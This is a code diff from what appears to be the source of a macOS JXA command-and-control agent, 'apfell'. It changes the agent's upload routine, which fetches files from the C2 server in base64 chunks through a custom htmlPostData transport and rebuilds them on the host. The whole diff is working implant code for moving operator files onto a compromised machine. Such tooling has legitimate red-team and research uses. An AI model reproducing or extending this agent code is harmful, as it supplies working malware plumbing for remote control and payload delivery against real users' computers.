@@ -507,27 +507,31 @@ class customC2 extends baseC2{
     }
     return output;
   }
-  upload(task, file_id, full_path){
-    try{
-        let data = {"action": "upload", "file_id": file_id, "chunk_size": this.chunk_size, "chunk_num": 1, "full_path": full_path, "task_id": task.id};
-        let chunk_num = 1;
-        let total_chunks = 1;
-        let total_data = $.NSMutableData.dataWithLength(0);
-        do{
-            let file_data = this.make_request("POST", apfell.id, data);
-            if(file_data['chunk_num'] === 0){
-                return {'status': 'error', 'user_output': "Error from the server", "completed": true};
-            }
-            chunk_num = file_data['chunk_num'];
-            total_chunks = file_data['total_chunks'];
-            total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data['chunk_data'])));
-            data = {"action": "upload", "file_id": file_id, "chunk_size": this.chunk_size, "chunk_num": chunk_num + 1, "task_id": task.id};
-        }while(chunk_num < total_chunks);
-      return total_data;
-    }catch(error){
-        return {'status': 'error', 'user_output': error.toString(), "completed": true};
+    upload(task, file_id, full_path){
+        try{
+            let data = {"action": "post_response", "responses":[
+                    {"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path}, "task_id": task.id},
+                ]};
+            let chunk_num = 1;
+            let total_chunks = 1;
+            let total_data = $.NSMutableData.dataWithLength(0);
+            do{
+                let file_data = this.htmlPostData(data, apfell.id);
+                if(file_data["responses"][0]['chunk_num'] === 0){
+                    return "error from server";
+                }
+                chunk_num = file_data["responses"][0]['chunk_num'];
+                total_chunks = file_data["responses"][0]['total_chunks'];
+                total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data["responses"][0]['chunk_data'])));
+                data = {"action": "post_response", "responses":[
+                        {"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1}, "task_id": task.id}
+                    ]};
+            }while(chunk_num < total_chunks);
+            return total_data;
+        }catch(error){
+            return error.toString();
+        }
     }
-  }
 }
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
 ObjC.import('Security');
